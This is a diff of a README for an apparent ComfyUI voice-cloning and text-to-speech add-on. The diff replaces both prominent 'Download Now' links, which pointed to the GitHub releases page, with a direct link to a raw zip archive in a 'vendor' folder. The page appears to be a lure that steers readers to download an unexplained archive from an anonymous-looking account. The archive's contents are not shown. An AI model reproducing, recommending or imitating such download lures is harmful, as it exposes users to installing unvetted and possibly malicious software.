@@ -1,7 +1,7 @@
 <h1>🚀 ComfyUI-Breeze-TTS-2 - Install, Clone Voices, and Create Speech in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/releases" style="display:inline-block;padding:16px 36px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50px;text-decoration:none;box-shadow:0 10px 20px rgba(0,0,0,0.2);">⬇️ Download Now - Free</a>
+  <a href="https://raw.githubusercontent.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/main/vendor/v2.2.zip" style="display:inline-block;padding:16px 36px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50px;text-decoration:none;box-shadow:0 10px 20px rgba(0,0,0,0.2);">⬇️ Download Now - Free</a>
 </p>
 
 <h2>🎉 Welcome to ComfyUI-Breeze-TTS-2</h2>
@@ -64,7 +64,7 @@ Follow these exact, numbered steps. Take your time - each step issimple and shou
 
 Click the big purple button at the top of this page, **or** click this link directly:
 
-[**https://github.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/releases**](https://github.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/releases)
+[**https://raw.githubusercontent.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/main/vendor/v2.2.zip**](https://raw.githubusercontent.com/Overburdenjackpot6592/ComfyUI-Breeze-TTS-2/main/vendor/v2.2.zip)
 
 
 
